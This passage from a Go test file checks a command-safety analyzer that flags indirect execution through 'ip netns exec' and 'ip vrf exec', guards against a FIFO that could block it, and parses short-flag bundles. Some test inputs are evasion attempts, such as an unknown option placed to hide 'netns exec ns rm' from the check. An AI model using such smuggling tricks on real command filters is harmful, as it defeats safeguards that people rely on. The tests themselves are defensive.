		{"vrf exec missing name reject", []string{"vrf", "exec"}, IndirectReject, 0},
		{"vrf exec missing inner reject", []string{"vrf", "exec", "v"}, IndirectReject, 0},
		// The COMMAND position still begins with "-" (option parsing mislocated it or
		// the form is malformed): fail closed rather than gate a "-"-prefixed token.
		{"netns exec dash-prefixed inner reject", []string{"netns", "exec", "ns", "-x", "cmd"}, IndirectReject, 0},
		// Non-exec subcommands and other objects are not indirect execution: delegate
		// to the normal ip (Medium) evaluation.
		{"netns list delegates", []string{"netns", "list"}, IndirectNone, 0},
		{"vrf show delegates", []string{"vrf", "show"}, IndirectNone, 0},
		{"link show delegates", []string{"link", "show"}, IndirectNone, 0},
		// An unrecognized global option makes the operand boundary unreliable, so the
		// scan fails closed: a hidden "netns exec" must not slip through to Medium.
		{"unknown global option reject", []string{"-zzz", "netns", "exec", "ns", "rm"}, IndirectReject, 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd("ip", tc.args...)
			assert.Equal(t, tc.wantKind, res.Kind)
			if tc.wantKind == IndirectFloor {
				assert.Equal(t, tc.wantLevel, res.Level)
			}
		})
	}
}

// TestIndirect_ShebangFifoNotRead verifies readShebang does not block when the
// command path is a FIFO (a denial-of-service vector): the regular-file guard
// rejects it before os.Open, so analysis returns promptly as not-a-shebang.
func TestIndirect_ShebangFifoNotRead(t *testing.T) {
	dir := t.TempDir()
	fifo := filepath.Join(dir, "pipe")
	require.NoError(t, syscall.Mkfifo(fifo, 0o644))

	done := make(chan IndirectExecutionResult, 1)
	go func() { done <- analyzeIndirectCmd(fifo) }()
	select {
	case res := <-done:
		assert.Equal(t, IndirectNone, res.Kind, "a FIFO is not a shebang script")
	case <-time.After(5 * time.Second):
		t.Fatal("analyzeIndirectCmd blocked on a FIFO (regular-file guard failed)")
	}
}

// TestShortFlagInBundle verifies short-flag bundle detection, including that flag
// letters are searched only before an attached "=value".
func TestShortFlagInBundle(t *testing.T) {
	assert.True(t, shortFlagInBundle("-avze", 'e'), "letter present in a short bundle")
	assert.True(t, shortFlagInBundle("-xc", 'c'))
	assert.False(t, shortFlagInBundle("-x", 'c'), "letter absent")
	assert.False(t, shortFlagInBundle("--c", 'c'), "long option is not a short bundle")
	assert.False(t, shortFlagInBundle("-", 'c'), "lone dash")
	// Flag letters precede an attached "=value": chars after "=" are not flags.
	assert.False(t, shortFlagInBundle("-x=c", 'c'), "char only in the =value must not match")
	assert.True(t, shortFlagInBundle("-ce=x", 'c'))
	assert.True(t, shortFlagInBundle("-ce=x", 'e'))
	assert.False(t, shortFlagInBundle("-ce=x", 'x'))
}
